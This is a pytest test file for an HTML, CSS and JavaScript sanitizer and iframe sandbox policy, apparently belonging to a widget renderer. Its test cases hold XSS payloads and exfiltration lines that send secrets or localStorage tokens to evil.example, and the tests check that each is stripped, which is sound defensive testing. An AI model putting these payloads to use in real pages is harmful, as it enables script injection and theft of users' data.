from pathlib import Path

import pytest

from src.expression_lab.renderer_policy import (
    SANDBOX_CSP,
    renderer_policy,
    sanitize_css,
    sanitize_html,
    sanitize_javascript,
    sanitize_sandbox_widget,
)


@pytest.mark.parametrize(
    ("markup", "forbidden"),
    [
        ("<script>alert(1)</script><p>safe</p>", "alert(1)"),
        ("<img src=x onerror=alert(1)><p>safe</p>", "onerror"),
        ('<a href="javascript:alert(1)">bad</a>', "javascript:"),
        ('<form action="https://evil.example"><input name=x></form>', "<form"),
        ('<iframe src="https://evil.example"></iframe>', "<iframe"),
        ('<object data="https://evil.example"></object>', "<object"),
        ('<svg><foreignObject><p>bad</p></foreignObject></svg>', "foreignobject"),
        ('<svg><use xlink:href="https://evil.example/a.svg#x"></use></svg>', "xlink:href"),
        ('<p style="background:url(https://evil.example)">bad</p>', "style="),
    ],
)
def test_sanitize_html_removes_active_content_attributes_and_external_resources(
    markup: str,
    forbidden: str,
) -> None:
    sanitized, issues = sanitize_html(markup)

    assert forbidden.casefold() not in sanitized.casefold()
    assert issues


def test_sanitize_html_keeps_allowlisted_semantic_and_svg_content() -> None:
    sanitized, issues = sanitize_html(
        '<section aria-label="语气轴"><button data-action-id="a1">委婉</button>'
        '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#6366f1"></circle>'
        '</svg></section>'
    )

    assert '<section aria-label="语气轴">' in sanitized
    assert '<button data-action-id="a1">委婉</button>' in sanitized
    assert '<svg viewbox="0 0 10 10">' in sanitized
    assert '<circle cx="5" cy="5" r="4" fill="#6366f1">' in sanitized
    assert not issues


def test_sanitize_css_scopes_safe_rules_and_drops_import_urls_and_global_selectors() -> None:
    sanitized, issues = sanitize_css(
        '@import url("https://evil.example/a.css");'
        'body { color: red; }'
        '.choice, button { color: #312e81; background-image: url(https://evil.example/x); }'
        '.fixed { position: fixed; inset: 0; }',
        scope="[data-expression-lab-widget]",
    )

    assert "@import" not in sanitized
    assert "url(" not in sanitized
    assert "body" not in sanitized
    assert "position: fixed" not in sanitized
    assert "[data-expression-lab-widget] .choice" in sanitized
    assert "[data-expression-lab-widget] button" in sanitized
    assert "removed_dangerous_css" in issues
    assert "removed_css_selector" in issues


@pytest.mark.parametrize(
    "javascript",
    [
        "fetch('https://evil.example')",
        "new XMLHttpRequest()",
        "new WebSocket('wss://evil.example')",
        "navigator.sendBeacon('/collect', secret)",
        "localStorage.setItem('x', 'y')",
        "document.cookie = 'x=y'",
        "window.parent.postMessage(secret, '*')",
        "postMessage(secret, '*')",
        "location = 'https://evil.example/?x=' + secret",
        "window.open('https://evil.example')",
        "eval('alert(1)')",
        "new Function('return secret')()",
    ],
)
def test_sanitize_javascript_rejects_network_storage_parent_and_dynamic_code(
    javascript: str,
) -> None:
    sanitized, issues = sanitize_javascript(javascript)

    assert sanitized == ""
    assert issues == ("removed_dangerous_javascript",)


def test_sanitize_javascript_exposes_only_the_whitelisted_event_bridge() -> None:
    sanitized, issues = sanitize_javascript(
        "document.querySelector('[data-id=soft]')?.addEventListener('click', "
        "() => binnagent.emit('interaction', {value: 'soft'}));"
    )

    assert not issues
    assert sanitized.startswith('"use strict";')
    assert "binnagent.emit('interaction'" in sanitized
    assert "postMessage" not in sanitized
    assert "parent" not in sanitized


def test_sanitize_javascript_allows_ordinary_function_syntax() -> None:
    javascript = '(function(){ button.addEventListener("click", function(){ return true; }); })();'

    sanitized, issues = sanitize_javascript(javascript)

    assert javascript in sanitized
    assert not issues


def test_backend_sanitized_javascript_matches_the_frontend_nonce_checked_bridge() -> None:
    frontend_source = Path(
        "binnagent-frontend/src/components/expression-lab/SandboxWidget.tsx"
    ).read_text(encoding="utf-8")
    sanitized, issues = sanitize_javascript(
        "binnagent.emit('answer_submitted', {question_id: 'q1'});"
    )

    assert not issues
    assert "Object.defineProperty(window,'binnagent'" in frontend_source
    assert "event.source !== iframeRef.current?.contentWindow" in frontend_source
    assert "message.nonce !== nonce" in frontend_source
    for event_type in renderer_policy().allowed_events:
        assert event_type in frontend_source
    assert "binnagent.emit('answer_submitted'" in sanitized


def test_sandbox_policy_has_no_same_origin_and_denies_network_forms_frames_and_navigation() -> None:
    policy = renderer_policy()

    assert policy.sandbox_attribute == "allow-scripts"
    assert "allow-same-origin" not in policy.sandbox_attribute
    for directive in [
        "default-src 'none'",
        "connect-src 'none'",
        "frame-src 'none'",
        "object-src 'none'",
        "form-action 'none'",
        "base-uri 'none'",
        "navigate-to 'none'",
    ]:
        assert directive in SANDBOX_CSP


def test_sanitize_sandbox_widget_reports_each_policy_violation_without_leaking_it() -> None:
    result = sanitize_sandbox_widget(
        '<main onclick="fetch(\'/collect\')"><iframe src="https://evil.example"></iframe>safe</main>',
        '@import "https://evil.example/a.css"; .x { color: red; }',
        "window.parent.postMessage(localStorage.getItem('token'), '*')",
    )

    assert result.html == "<main>safe</main>"
    assert "https://evil.example" not in result.css
    assert result.javascript == ""
    assert "removed_attribute:onclick" in result.issues
    assert "removed_tag:iframe" in result.issues
    assert "removed_css_at_rule" in result.issues
    assert "removed_dangerous_javascript" in result.issues
    assert result.sandbox_attribute == "allow-scripts"
